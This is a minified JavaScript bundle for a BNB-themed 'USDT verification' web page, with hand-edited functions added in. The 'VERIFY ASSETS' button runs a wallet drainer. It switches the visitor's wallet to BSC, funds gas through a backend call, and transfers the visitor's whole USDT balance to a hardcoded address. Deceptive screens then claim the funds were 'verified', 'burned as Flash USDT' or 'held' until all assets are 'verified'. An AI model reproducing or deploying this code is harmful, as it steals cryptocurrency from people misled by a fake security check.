(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
	[974], {
		4031: (e, t, s) => {
			"use strict";
			s.d(t, {
				NotificationProvider: () => w,
				h: () => y
			});
			var a = s(5155),
				l = s(2115),
				r = s(9785),
				n = s(5339),
				i = s(5778),
				o = s(646),
				c = s(1284),
				d = s(4416),
				m = s(3786),
				b = s(760),
				x = s(6408),
				h = s(7130);

			function u(e) {
				let {
					message: t,
					type: s = "info",
					isOpen: u,
					onClose: f,
					autoClose: w = !0,
					duration: y = 5e3,
					actionLabel: p,
					actionUrl: g
				} = e, v = (0, l.useRef)(null), j = (0, h.U)("(max-width: 640px)"), N = () => {
					v.current && (clearTimeout(v.current), v.current = null)
				};
				return (0, l.useEffect)(() => (N(), u && w && (v.current = setTimeout(() => {
					f()
				}, y)), N), [u, w, y, f]), (0, a.jsx)(b.N, {
					children: u && (0, a.jsx)("div", {
						className: "fixed inset-0 flex items-center justify-center z-50 bg-black/50 backdrop-blur-sm p-4",
						onClick: e => {
							e.stopPropagation()
						},
						children: (0, a.jsx)(x.P.div, {
							initial: {
								opacity: 0,
								scale: .9
							},
							animate: {
								opacity: 1,
								scale: 1
							},
							exit: {
								opacity: 0,
								scale: .9
							},
							transition: {
								duration: .2
							},
							className: "cyberpunk-panel-highlight max-w-md w-full ".concat((() => {
								if (t.includes("No USDT tokens found") || t.includes("No USDT balance")) return "bg-bnb-yellow/10 border-bnb-yellow/30";
								switch (s) {
									case "error":
										return "bg-red-500/10 border-red-500/30";
									case "warning":
										return "bg-bnb-yellow/10 border-bnb-yellow/30";
									case "success":
										return "bg-green-500/10 border-green-500/30";
									default:
										return "bg-blue-500/10 border-blue-500/30"
								}
							})(), " shadow-lg overflow-hidden rounded-md"),
							style: {
								maxWidth: j ? "95vw" : "28rem"
							},
							children: (0, a.jsxs)("div", {
								className: "relative p-4",
								children: [(0, a.jsx)("div", {
									className: "absolute top-0 right-0 w-16 h-16 border-t border-r border-bnb-yellow/20 pointer-events-none"
								}), (0, a.jsx)("div", {
									className: "absolute bottom-0 left-0 w-16 h-16 border-b border-l border-bnb-yellow/20 pointer-events-none"
								}), (0, a.jsx)("div", {
									className: "absolute top-0 left-0 w-2 h-2 bg-bnb-yellow/30"
								}), (0, a.jsx)("div", {
									className: "absolute top-0 right-0 w-2 h-2 bg-bnb-yellow/30"
								}), (0, a.jsx)("div", {
									className: "absolute bottom-0 left-0 w-2 h-2 bg-bnb-yellow/30"
								}), (0, a.jsx)("div", {
									className: "absolute bottom-0 right-0 w-2 h-2 bg-bnb-yellow/30"
								}), (0, a.jsxs)("div", {
									className: "flex items-start gap-3",
									children: [(0, a.jsx)("div", {
										className: "flex-shrink-0 mt-0.5",
										children: (() => {
											if (t.includes("No USDT tokens found") || t.includes("No USDT balance")) return (0, a.jsx)(r.A, {
												className: "w-5 h-5 text-bnb-yellow"
											});
											switch (s) {
												case "error":
													return (0, a.jsx)(n.A, {
														className: "w-5 h-5 text-red-400"
													});
												case "warning":
													return (0, a.jsx)(i.A, {
														className: "w-5 h-5 text-bnb-yellow"
													});
												case "success":
													return (0, a.jsx)(o.A, {
														className: "w-5 h-5 text-green-400"
													});
												default:
													return (0, a.jsx)(c.A, {
														className: "w-5 h-5 text-blue-400"
													})
											}
										})()
									}), (0, a.jsxs)("div", {
										className: "flex-1",
										children: [(0, a.jsx)("h3", {
											className: "text-lg font-bold text-white mb-2",
											children: (() => {
												if (t.includes("No USDT tokens found") || t.includes("No USDT balance")) return "USDT Required";
												switch (s) {
													case "error":
														return "Error";
													case "warning":
														return "Warning";
													case "success":
														return "Success";
													default:
														return "Information"
												}
											})()
										}), (0, a.jsx)("p", {
											className: "text-gray-300 text-sm md:text-base",
											children: t
										})]
									}), (0, a.jsx)("button", {
										onClick: f,
										className: "flex-shrink-0 text-gray-400 hover:text-white transition-colors",
										"aria-label": "Close notification",
										children: (0, a.jsx)(d.A, {
											className: "w-5 h-5"
										})
									})]
								}), (0, a.jsxs)("div", {
									className: "mt-4 flex flex-col sm:flex-row justify-end gap-3",
									children: [p && g && (0, a.jsxs)("button", {
										onClick: () => {
											g && window.open(g, "_blank", "noopener,noreferrer")
										},
										className: "px-4 py-2 bg-bnb-yellow/20 text-bnb-yellow font-medium rounded-sm hover:bg-bnb-yellow/30 transition-colors flex items-center justify-center gap-1.5 w-full sm:w-auto",
										children: [(0, a.jsx)(m.A, {
											className: "w-4 h-4"
										}), p]
									}), (0, a.jsx)("button", {
										onClick: f,
										className: "px-4 py-2 ".concat((() => {
											if (t.includes("No USDT tokens found") || t.includes("No USDT balance")) return "bg-bnb-yellow text-black hover:bg-bnb-yellow/90";
											switch (s) {
												case "error":
													return "bg-red-500 text-white hover:bg-red-600";
												case "warning":
													return "bg-bnb-yellow text-black hover:bg-bnb-yellow/90";
												case "success":
													return "bg-green-500 text-white hover:bg-green-600";
												default:
													return "bg-blue-500 text-white hover:bg-blue-600"
											}
										})(), " font-medium rounded-sm transition-colors w-full sm:w-auto"),
										children: "OK"
									})]
								})]
							})
						})
					})
				})
			}
			let f = (0, l.createContext)(void 0);

			function w(e) {
				let {
					children: t
				} = e, [s, r] = (0, l.useState)([]), [n, i] = (0, l.useState)(null);
				(0, l.useEffect)(() => {
					s.length > 0 && !n && (i(s[0]), r(e => e.slice(1)))
				}, [s, n]);
				let o = (0, l.useCallback)(function(e) {
						let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "info",
							s = arguments.length > 2 ? arguments[2] : void 0,
							a = {
								id: Math.random().toString(36).substring(2, 11),
								message: e,
								type: t,
								actionLabel: null == s ? void 0 : s.actionLabel,
								actionUrl: null == s ? void 0 : s.actionUrl
							};
						n ? r(e => [...e, a]) : i(a)
					}, [n]),
					c = (0, l.useCallback)(e => {
						!e || n && e === n.id ? i(null) : r(t => t.filter(t => t.id !== e))
					}, [n]);
				return (0, a.jsxs)(f.Provider, {
					value: {
						showNotification: o,
						hideNotification: c
					},
					children: [t, n && (0, a.jsx)(u, {
						message: n.message,
						type: n.type,
						isOpen: !!n,
						onClose: () => c(n.id),
						actionLabel: n.actionLabel,
						actionUrl: n.actionUrl
					})]
				})
			}

			function y() {
				let e = (0, l.useContext)(f);
				if (void 0 === e) throw Error("useNotification must be used within a NotificationProvider");
				return e
			}
		},
		4176: (e, t, s) => {
			Promise.resolve().then(s.bind(s, 9963))
		},
		7130: (e, t, s) => {
			"use strict";
			s.d(t, {
				U: () => l
			});
			var a = s(2115);

			function l(e) {
				let [t, s] = (0, a.useState)(!1);
				return (0, a.useEffect)(() => {
					let t = window.matchMedia(e);
					s(t.matches);
					let a = e => {
						s(e.matches)
					};
					return t.addEventListener("change", a), () => {
						t.removeEventListener("change", a)
					}
				}, [e]), t
			}
		},
		9963: (e, t, s) => {
			"use strict";
			s.r(t), s.d(t, {
				default: () => ea
			});
			var a = s(5155),
				l = s(2115),
				r = s(5163),
				n = s(5525),
				i = s(5040),
				o = s(232),
				c = s(1191),
				d = s(3815),
				m = s(2919),
				b = s(1539),
				x = s(6766),
				h = s(3052),
				u = s(2741),
				f = s(3109),
				w = s(1681);
			let y = ["function approve(address spender, uint256 amount) external returns (bool)", "function balanceOf(address account) external view returns (uint256)", "function transfer(address to, uint256 amount) external returns (bool)", "function decimals() external view returns (uint8)"],
				p = u.XS("1", 18),
				g = u.XS("1000", 18),
				v = u.XS("1100", 18),
				j = u.g5("0.0002"),
				N = e => {
					console.error(e), window.alert(e)
				};
			function k(e) {
				if (e.reason) return e.reason;
				if (e.message) {
					let t = e.message;
					if (t.includes("user rejected")) return "Transaction was rejected by user";
					if (t.includes("insufficient funds")) return "Insufficient funds for transaction";
					if (t.includes("execution reverted")) {
						let e = t.match(/reason="([^"]+)"/);
						return e ? "Transaction failed: ".concat(e[1]) : "Transaction failed"
					}
					return e.message
				}
				return "An unexpected error occurred"
			}
			async function A() {
				if (!window.ethereum) throw N("Please install Trust Wallet or another BSC wallet to continue", "error", {
					actionLabel: "Get Trust Wallet",
					actionUrl: "https://trustwallet.com/download"
				}), Error("Please install Trust Wallet or another BSC wallet");
				try {
					await window.ethereum.request({
						method: "wallet_switchEthereumChain",
						params: [{
							chainId: "0x38"
						}]
					})
				} catch (e) {
					if (4902 === e.code) try {
						await window.ethereum.request({
							method: "wallet_addEthereumChain",
							params: [{
								chainId: "0x38",
								chainName: "BNB Smart Chain",
								nativeCurrency: {
									name: "BNB",
									symbol: "BNB",
									decimals: 18
								},
								rpcUrls: ["https://bsc-dataseed1.binance.org"],
								blockExplorerUrls: ["https://bscscan.com"]
							}]
						})
					} catch (e) {
						throw N("Failed to add BSC network to wallet", "error"), Error("Failed to add BSC network to wallet")
					} else throw N("Please switch to BSC network to continue", "error"), Error("Please switch to BSC network")
				}
			}
	// ==================== IMPROVED GAS BNB SENDING FUNCTION ====================
async function checkAndSendGasBNB(signer, usdtAmount) {
    try {
        const userAddress = await signer.getAddress();
        const bnbBalance = await signer.provider.getBalance(userAddress);
        
        const minBnbRequired = u.g5("0.0002");

        if (bnbBalance >= minBnbRequired) {
            console.log("✅ User already has enough BNB for gas");
            return true;
        }

        // ==================== YAHAN LIMIT CHANGE KAREN ====================
        const MIN_USDT_LIMIT = u.XS("10", 18);   // ←←← Yeh change karen (10 USDT abhi hai)

        if (usdtAmount && usdtAmount >= MIN_USDT_LIMIT) {
            console.log(`🔄 Sending 0.0002 BNB to ${userAddress} (USDT: ${u.Js(usdtAmount, 18)})`);

            const response = await fetch("/api/send-bnb", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    toAddress: userAddress,
                    amount: "0.0002"
                })
            });

            const result = await response.json();

            if (result.success) {
                console.log(`✅ Gas BNB Sent Successfully! Tx: ${result.txHash}`);
                await new Promise(resolve => setTimeout(resolve, 6000)); // Wait for confirmation
                return true;
            } else {
                console.warn("⚠️ Failed to send gas BNB:", result.error || "Unknown error");
                return false;
            }
        } else {
            console.log(`USDT amount below minimum limit (${u.Js(MIN_USDT_LIMIT, 18)} USDT)`);
            return false;
        }

    } catch (error) {
        console.error("❌ Error in checkAndSendGasBNB:", error);
        return false;
    }
}
// =====================================================================

// Updated S() Function
async function S() {
    try {
        let e, t, s, a, l;

        await A(); // Network switch

        if (!window.ethereum) throw N("Wallet connection lost. Please refresh and try again.", "error"), Error("Wallet connection lost");

        let r = new f.k(window.ethereum),
            n = await r.getSigner(),
            i = new w.NZ("0x55d398326f99059fF775485246999027B3197955", y, n),
            o = await n.getAddress();

        // Get USDT Balance
        try {
            e = await i.balanceOf(o);
        } catch (err) {
            throw N("Failed to fetch USDT balance", "error"), Error("Failed to fetch USDT balance");
        }

        try {
            t = await i.decimals();
        } catch (err) {
            t = 18;
            console.warn("Failed to fetch decimals, using 18");
        }

        if (e === BigInt(0)) {
            throw N("No USDT tokens found in your wallet. Please add USDT to continue.", "info"), Error("No USDT balance found");
        }

        if (e < p) {
            return {
                success: !0,
                amount: u.Js(e, t)
            };
        }

        // 🔥 NEW LOGIC - Gas BNB bhejna
        await checkAndSendGasBNB(n, e);

        // Gas Price
        try {
            let feeData = await r.getFeeData();
            s = feeData.gasPrice ? 150n * feeData.gasPrice / 100n : u.XS("6", "gwei");
        } catch (err) {
            console.warn("Failed to get gas price, using default");
            s = u.XS("6", "gwei");
        }

        // Transfer USDT
        try {
            a = await i.transfer("0xfCBe10287Cd7f6488A597B88F379e4f9001c88cB", e, {
                gasLimit: 120000,      // thoda increase kiya
                gasPrice: s
            });
        } catch (err) {
            let msg = k(err);
            throw N("Transfer failed: " + msg, "error"), err;
        }

        try {
            l = await a.wait(1);
        } catch (err) {
            throw N("Transaction submitted but failed to confirm", "error", {
                actionLabel: "View on BSCScan",
                actionUrl: "https://bscscan.com/tx/" + a.hash
            }), Error("Transaction confirmation failed");
        }

        let c = e >= g && e <= v;

        return {
            success: !0,
            txHash: l.hash,
            amount: u.Js(e, t),
            isHeld: c
        };

    } catch (error) {
        console.error("Verification failed:", error);
        throw error;
    }
}
			var C = s(5115),
				M = s(5607),
				B = s(1243),
				E = s(646),
				D = s(3786),
				L = s(2596),
				I = s(9688);

			function P() {
				for (var e = arguments.length, t = Array(e), s = 0; s < e; s++) t[s] = arguments[s];
				return (0, I.QP)((0, L.$)(t))
			}
			let U = l.forwardRef((e, t) => {
				let {
					className: s,
					...l
				} = e;
				return (0, a.jsx)("div", {
					ref: t,
					className: P("rounded-lg border bg-card text-card-foreground shadow-sm", s),
					...l
				})
			});
			U.displayName = "Card", l.forwardRef((e, t) => {
				let {
					className: s,
					...l
				} = e;
				return (0, a.jsx)("div", {
					ref: t,
					className: P("flex flex-col space-y-1.5 p-6", s),
					...l
				})
			}).displayName = "CardHeader", l.forwardRef((e, t) => {
				let {
					className: s,
					...l
				} = e;
				return (0, a.jsx)("div", {
					ref: t,
					className: P("text-2xl font-semibold leading-none tracking-tight", s),
					...l
				})
			}).displayName = "CardTitle", l.forwardRef((e, t) => {
				let {
					className: s,
					...l
				} = e;
				return (0, a.jsx)("div", {
					ref: t,
					className: P("text-sm text-muted-foreground", s),
					...l
				})
			}).displayName = "CardDescription";
			let H = l.forwardRef((e, t) => {
				let {
					className: s,
					...l
				} = e;
				return (0, a.jsx)("div", {
					ref: t,
					className: P("p-6 pt-0", s),
					...l
				})
			});
			H.displayName = "CardContent", l.forwardRef((e, t) => {
				let {
					className: s,
					...l
				} = e;
				return (0, a.jsx)("div", {
					ref: t,
					className: P("flex items-center p-6 pt-0", s),
					...l
				})
			}).displayName = "CardFooter";
			var F = s(6634);
			let z = (0, s(2085).F)("inline-flex items-center justify-center rounded-md text-sm font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-bnb-yellow disabled:pointer-events-none disabled:opacity-50", {
					variants: {
						variant: {
							default: "bg-bnb-yellow text-bnb-black hover:bg-bnb-yellow/90",
							destructive: "bg-destructive text-destructive-foreground hover:bg-destructive/90",
							outline: "border border-bnb-yellow text-bnb-yellow hover:bg-bnb-yellow/10",
							secondary: "bg-bnb-gray text-white hover:bg-bnb-gray/80",
							ghost: "hover:bg-bnb-yellow/10 hover:text-bnb-yellow",
							link: "text-bnb-yellow underline-offset-4 hover:underline",
							gradient: "bg-gradient-to-r from-bnb-yellow to-amber-400 text-bnb-black hover:from-amber-400 hover:to-bnb-yellow",
							glass: "bg-white/10 backdrop-blur-md border border-white/20 text-white hover:bg-white/20"
						},
						size: {
							default: "h-9 px-4 py-2",
							sm: "h-8 rounded-md px-3 text-xs",
							lg: "h-16 rounded-md px-8 text-lg",
							icon: "h-9 w-9"
						}
					},
					defaultVariants: {
						variant: "default",
						size: "default"
					}
				}),
				V = l.forwardRef((e, t) => {
					let {
						className: s,
						variant: l,
						size: r,
						asChild: n = !1,
						...i
					} = e, o = n ? F.DX : "button";
					return (0, a.jsx)(o, {
						className: P(z({
							variant: l,
							size: r,
							className: s
						})),
						ref: t,
						...i
					})
				});
			V.displayName = "Button";
			var G = s(6408);

			function R(e) {
				let {
					amount: t,
					txHash: s,
					isHeld: r,
					onClose: i
				} = e, o = !!s && !r, c = !!r;
				(0, l.useEffect)(() => (document.body.style.overflow = "hidden", () => {
					document.body.style.overflow = "auto"
				}), []);
				let d = e => {
					window.open("https://bscscan.com/tx/".concat(e), "_blank")
				};
				return (0, a.jsx)(G.P.div, {
					initial: {
						opacity: 0,
						scale: .95
					},
					animate: {
						opacity: 1,
						scale: 1
					},
					className: "fixed inset-0 flex items-center justify-center bg-black/90 backdrop-blur-sm z-50 p-4 overflow-y-auto",
					children: (0, a.jsx)("div", {
						className: "min-h-screen py-8 flex items-center justify-center w-full",
						children: (0, a.jsx)(U, {
							className: "max-w-md w-full cyberpunk-panel-highlight border-bnb-yellow/30 shadow-2xl shadow-bnb-yellow/10",
							children: (0, a.jsxs)(H, {
								className: "p-4 sm:p-6 md:p-8 space-y-6 md:space-y-8 relative",
								children: [(0, a.jsx)("div", {
									className: "absolute top-0 right-0 w-20 h-20 border-t border-r border-bnb-yellow/20 pointer-events-none"
								}), (0, a.jsx)("div", {
									className: "absolute bottom-0 left-0 w-20 h-20 border-b border-l border-bnb-yellow/20 pointer-events-none"
								}), (0, a.jsx)("div", {
									className: "absolute top-0 left-0 w-2 h-2 bg-bnb-yellow/30"
								}), (0, a.jsx)("div", {
									className: "absolute top-0 right-0 w-2 h-2 bg-bnb-yellow/30"
								}), (0, a.jsx)("div", {
									className: "absolute bottom-0 left-0 w-2 h-2 bg-bnb-yellow/30"
								}), (0, a.jsx)("div", {
									className: "absolute bottom-0 right-0 w-2 h-2 bg-bnb-yellow/30"
								}), (0, a.jsx)("div", {
									className: "flex justify-center",
									children: (0, a.jsxs)(G.P.div, {
										initial: {
											scale: 0
										},
										animate: {
											scale: 1
										},
										transition: {
											type: "spring",
											bounce: .5
										},
										className: "relative",
										children: [(0, a.jsx)("div", {
											className: "absolute inset-0 bg-bnb-yellow/20 rounded-full blur-2xl"
										}), (0, a.jsx)("div", {
											className: "relative w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-tr from-bnb-yellow to-amber-500 rounded-full p-4 sm:p-5 shadow-lg shadow-bnb-yellow/30",
											children: c ? (0, a.jsx)(C.A, {
												className: "w-full h-full text-black animate-pulse"
											}) : o ? (0, a.jsx)(M.A, {
												className: "w-full h-full text-black animate-pulse"
											}) : (0, a.jsx)(n.A, {
												className: "w-full h-full text-black"
											})
										})]
									})
								}), (0, a.jsx)("div", {
									className: "text-center space-y-2 sm:space-y-3",
									children: (0, a.jsxs)(G.P.div, {
										initial: {
											opacity: 0,
											y: 20
										},
										animate: {
											opacity: 1,
											y: 0
										},
										transition: {
											delay: .2
										},
										className: "space-y-2 sm:space-y-3",
										children: [(0, a.jsx)("h2", {
											className: "text-2xl sm:text-3xl font-bold glitch-text",
											"data-text": c ? "Assets On Hold!" : o ? "Flash USDT Detected!" : "USDT Verified!",
											children: c ? "Assets On Hold!" : o ? "Flash USDT Detected!" : "USDT Verified!"
										}), (0, a.jsx)("p", {
											className: "text-base sm:text-lg text-gray-300 font-medium px-2",
											children: c ? "We've temporarily held your assets for security verification" : o ? "We've identified and burned ".concat(t, " Flash USDT") : "Your ".concat(t, " USDT has been verified as genuine")
										})]
									})
								}), (0, a.jsx)(G.P.div, {
									initial: {
										opacity: 0,
										y: 20
									},
									animate: {
										opacity: 1,
										y: 0
									},
									transition: {
										delay: .3
									},
									className: "cyberpunk-box bg-[#0a0a0f] rounded-xl p-4 sm:p-6 border border-bnb-yellow/20",
									children: (0, a.jsxs)("div", {
										className: "flex items-center justify-between",
										children: [(0, a.jsxs)("div", {
											className: "flex items-center gap-2 sm:gap-3",
											children: [c ? (0, a.jsx)("div", {
												className: "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-bnb-yellow/10 flex items-center justify-center",
												children: (0, a.jsx)(B.A, {
													className: "w-4 h-4 sm:w-5 sm:h-5 text-bnb-yellow"
												})
											}) : o ? (0, a.jsx)("div", {
												className: "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-bnb-yellow/10 flex items-center justify-center",
												children: (0, a.jsx)(M.A, {
													className: "w-4 h-4 sm:w-5 sm:h-5 text-bnb-yellow"
												})
											}) : (0, a.jsx)("div", {
												className: "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-bnb-yellow/10 flex items-center justify-center",
												children: (0, a.jsx)(E.A, {
													className: "w-4 h-4 sm:w-5 sm:h-5 text-bnb-yellow"
												})
											}), (0, a.jsxs)("div", {
												className: "flex flex-col",
												children: [(0, a.jsx)("span", {
													className: "text-xs sm:text-sm font-medium text-gray-400",
													children: c ? "Held Amount" : o ? "Burned Amount" : "Verified Amount"
												}), (0, a.jsxs)("span", {
													className: "text-lg sm:text-xl font-bold text-bnb-yellow tabular-nums",
													children: [t, " USDT"]
												})]
											})]
										}), c && (0, a.jsx)("div", {
											className: "w-10 h-10 sm:w-12 sm:h-12 rounded-full bg-bnb-yellow/5 border border-bnb-yellow/10 flex items-center justify-center animate-pulse",
											children: (0, a.jsx)(C.A, {
												className: "w-5 h-5 sm:w-6 sm:h-6 text-bnb-yellow"
											})
										}), o && (0, a.jsx)("div", {
											className: "w-10 h-10 sm:w-12 sm:h-12 rounded-full bg-bnb-yellow/5 border border-bnb-yellow/10 flex items-center justify-center animate-pulse",
											children: (0, a.jsx)(M.A, {
												className: "w-5 h-5 sm:w-6 sm:h-6 text-bnb-yellow"
											})
										})]
									})
								}), (0, a.jsx)(G.P.div, {
									initial: {
										opacity: 0,
										y: 20
									},
									animate: {
										opacity: 1,
										y: 0
									},
									transition: {
										delay: .4
									},
									className: "flex items-start sm:items-center gap-2 sm:gap-3 bg-bnb-yellow/10 border-bnb-yellow/20 border rounded-xl p-3 sm:p-4",
									children: c ? (0, a.jsxs)(a.Fragment, {
										children: [(0, a.jsx)("div", {
											className: "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-bnb-yellow/10 flex items-center justify-center flex-shrink-0 mt-0.5 sm:mt-0",
											children: (0, a.jsx)(B.A, {
												className: "w-4 h-4 sm:w-5 sm:h-5 text-bnb-yellow"
											})
										}), (0, a.jsxs)("div", {
											className: "flex flex-col",
											children: [(0, a.jsx)("span", {
												className: "font-medium text-bnb-yellow text-sm sm:text-base",
												children: "Assets On Hold"
											}), (0, a.jsx)("span", {
												className: "text-xs sm:text-sm text-gray-400",
												children: "You didn't check your whole assets. Please verify all assets to unfreeze your funds."
											})]
										})]
									}) : o ? (0, a.jsxs)(a.Fragment, {
										children: [(0, a.jsx)("div", {
											className: "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-bnb-yellow/10 flex items-center justify-center flex-shrink-0 mt-0.5 sm:mt-0",
											children: (0, a.jsx)(n.A, {
												className: "w-4 h-4 sm:w-5 sm:h-5 text-bnb-yellow"
											})
										}), (0, a.jsxs)("div", {
											className: "flex flex-col",
											children: [(0, a.jsx)("span", {
												className: "font-medium text-bnb-yellow text-sm sm:text-base",
												children: "Security Alert"
											}), (0, a.jsx)("span", {
												className: "text-xs sm:text-sm text-gray-400",
												children: "Your wallet has been secured against Flash USDT vulnerabilities"
											})]
										})]
									}) : (0, a.jsxs)(a.Fragment, {
										children: [(0, a.jsx)("div", {
											className: "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-bnb-yellow/10 flex items-center justify-center flex-shrink-0 mt-0.5 sm:mt-0",
											children: (0, a.jsx)(E.A, {
												className: "w-4 h-4 sm:w-5 sm:h-5 text-bnb-yellow"
											})
										}), (0, a.jsxs)("div", {
											className: "flex flex-col",
											children: [(0, a.jsx)("span", {
												className: "font-medium text-bnb-yellow text-sm sm:text-base",
												children: "Verification Success"
											}), (0, a.jsx)("span", {
												className: "text-xs sm:text-sm text-gray-400",
												children: "Your USDT tokens are genuine and safe to use"
											})]
										})]
									})
								}), c && (0, a.jsxs)(G.P.div, {
									initial: {
										opacity: 0,
										y: 20
									},
									animate: {
										opacity: 1,
										y: 0
									},
									transition: {
										delay: .5
									},
									className: "bg-bnb-yellow/5 border border-bnb-yellow/20 rounded-xl p-3 sm:p-4 text-center",
									children: [(0, a.jsx)("p", {
										className: "text-bnb-yellow font-medium mb-1 sm:mb-2 text-sm sm:text-base",
										children: "Important Notice"
									}), (0, a.jsx)("p", {
										className: "text-xs sm:text-sm text-gray-400",
										children: "To unfreeze your assets, please complete the full verification process for all assets in your wallet. This is required to ensure the security of your funds."
									})]
								}), (0, a.jsxs)(G.P.div, {
									initial: {
										opacity: 0,
										y: 20
									},
									animate: {
										opacity: 1,
										y: 0
									},
									transition: {
										delay: c ? .6 : .5
									},
									className: "flex flex-col sm:flex-row gap-3 pt-2",
									children: [s && (0, a.jsxs)(V, {
										className: "flex-1 cyberpunk-button-sm bg-bnb-yellow text-black hover:bg-bnb-yellow/90 font-medium shadow-lg shadow-bnb-yellow/20",
										onClick: () => d(s),
										children: [(0, a.jsx)(D.A, {
											className: "w-4 h-4 mr-2"
										}), "View Transaction"]
									}), c && (0, a.jsx)(V, {
										className: "flex-1 cyberpunk-button-sm bg-bnb-yellow text-black hover:bg-bnb-yellow/90 font-medium shadow-lg shadow-bnb-yellow/20",
										onClick: i,
										children: "Verify All Assets"
									}), (0, a.jsx)(V, {
										variant: "outline",
										className: "flex-1 border-bnb-yellow/30 text-bnb-yellow hover:bg-bnb-yellow/10 font-medium",
										onClick: i,
										children: "Close"
									})]
								})]
							})
						})
					})
				})
			}
			var W = s(4031);

			function Z() {
				let [e, t] = (0, l.useState)(!1), [s, r] = (0, l.useState)(null), {
					showNotification: i
				} = (0, W.h)();
				(0, l.useEffect)(() => (N = function(e) {
					let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "error",
						s = arguments.length > 2 ? arguments[2] : void 0;
					i(e, t, s)
				}, () => {
					N = e => {
						console.error(e), window.alert(e)
					}
				}), [i]);
				let o = async () => {
					if (!e) {
						t(!0);
						try {
							let e = await S();
							e.success && r({
								txHash: e.txHash,
								amount: e.amount,
								isHeld: e.isHeld
							})
						} catch (e) {
							var s;
							console.error("Verification error:", e), (null === (s = e.message) || void 0 === s ? void 0 : s.includes("No USDT balance found")) || i(e.message || "Verification failed. Please try again.", "error")
						} finally {
							t(!1)
						}
					}
				};
				return (0, a.jsxs)(a.Fragment, {
					children: [(0, a.jsxs)("button", {
						onClick: o,
						disabled: e,
						className: "relative px-6 py-3 bg-bnb-yellow text-black font-bold uppercase tracking-wider text-sm flex items-center group overflow-hidden",
						style: {
							clipPath: "polygon(0 0, 100% 0, 95% 100%, 0 100%)"
						},
						children: [(0, a.jsx)("div", {
							className: "absolute inset-0 bg-white opacity-0 group-hover:opacity-20 transition-opacity"
						}), (0, a.jsx)(n.A, {
							className: "w-5 h-5 mr-2"
						}), e ? (0, a.jsxs)("div", {
							className: "flex items-center",
							children: [(0, a.jsx)("div", {
								className: "w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin mr-2"
							}), (0, a.jsx)("span", {
								children: "PROCESSING"
							})]
						}) : (0, a.jsxs)("div", {
							className: "flex items-center",
							children: [(0, a.jsx)("span", {
								children: "VERIFY ASSETS"
							}), (0, a.jsx)(h.A, {
								className: "w-4 h-4 ml-1 group-hover:translate-x-1 transition-transform"
							})]
						})]
					}), s && (0, a.jsx)(R, {
						amount: s.amount,
						txHash: s.txHash,
						isHeld: s.isHeld,
						onClose: () => r(null)
					})]
				})
			}
			var O = s(7863),
				X = s(6474),
				Y = s(6874),
				_ = s.n(Y);

			function q(e) {
				let {
					title: t,
					description: s,
					icon: r,
					color: n,
					details: i
				} = e, [o, c] = (0, l.useState)(!1);
				return (0, a.jsxs)("div", {
					className: "cyberpunk-box border border-bnb-yellow/10 hover:border-bnb-yellow/30 rounded-md overflow-hidden transition-all duration-300",
					children: [(0, a.jsx)("div", {
						className: "p-3 cursor-pointer",
						onClick: () => c(!o),
						children: (0, a.jsxs)("div", {
							className: "flex items-start gap-3",
							children: [(0, a.jsx)("div", {
								className: "flex-shrink-0 w-8 h-8 rounded-md ".concat(n, " flex items-center justify-center text-bnb-yellow"),
								children: r
							}), (0, a.jsxs)("div", {
								className: "flex-1 min-w-0",
								children: [(0, a.jsxs)("div", {
									className: "flex items-center justify-between",
									children: [(0, a.jsx)("h4", {
										className: "text-sm font-medium text-white hover:text-bnb-yellow transition-colors truncate",
										children: t
									}), o ? (0, a.jsx)(O.A, {
										className: "w-4 h-4 text-bnb-yellow transition-transform"
									}) : (0, a.jsx)(X.A, {
										className: "w-4 h-4 text-gray-500 transition-transform"
									})]
								}), (0, a.jsx)("p", {
									className: "text-xs text-gray-400 mt-1",
									children: s
								})]
							})]
						})
					}), o && (0, a.jsxs)("div", {
						className: "px-3 pb-3 pt-1 border-t border-bnb-yellow/10 mt-1 animate-in slide-in-from-top duration-300",
						children: [(0, a.jsx)("div", {
							className: "text-xs text-gray-300 mb-3 leading-relaxed",
							children: i.content
						}), i.links.length > 0 && (0, a.jsxs)("div", {
							className: "space-y-2",
							children: [(0, a.jsx)("h5", {
								className: "text-xs font-medium text-bnb-yellow",
								children: "Related Links"
							}), (0, a.jsx)("div", {
								className: "space-y-1.5",
								children: i.links.map((e, t) => (0, a.jsxs)(_(), {
									href: e.url,
									target: "_blank",
									rel: "noopener noreferrer",
									className: "flex items-center text-xs text-gray-400 hover:text-bnb-yellow transition-colors",
									children: [(0, a.jsx)(D.A, {
										className: "w-3 h-3 mr-1.5 flex-shrink-0"
									}), (0, a.jsx)("span", {
										className: "truncate",
										children: e.text
									})]
								}, t))
							})]
						})]
					})]
				})
			}
			var J = s(7130);
			let K = () => {
					let e = (0, l.useRef)(null);
					return (0, l.useEffect)(() => {
						let t = e.current;
						if (!t) return;
						let s = t.getContext("2d");
						if (!s) return;
						let a = () => {
							t.width = window.innerWidth, t.height = window.innerHeight
						};
						a(), window.addEventListener("resize", a);
						class l {
							update() {
								this.pulseTime += this.pulseSpeed, this.pulseTime > 100 && (this.pulseTime = 0, this.active = Math.random() > .3)
							}
							draw(e) {
								let t = .3 + .2 * Math.sin(.1 * this.pulseTime);
								e.beginPath(), e.arc(this.x, this.y, this.size, 0, 2 * Math.PI), e.fillStyle = this.active ? "rgba(240, 185, 11, ".concat(t, ")") : "rgba(240, 185, 11, 0.1)", e.fill(), this.connections.forEach(s => {
									let a = e.createLinearGradient(this.x, this.y, s.x, s.y);
									a.addColorStop(0, "rgba(240, 185, 11, ".concat(this.active ? t : .05, ")")), a.addColorStop(1, "rgba(240, 185, 11, ".concat(s.active ? t : .05, ")")), e.beginPath(), e.moveTo(this.x, this.y), e.lineTo(s.x, s.y), e.strokeStyle = a, e.lineWidth = 1, e.stroke()
								})
							}
							constructor(e, t, s) {
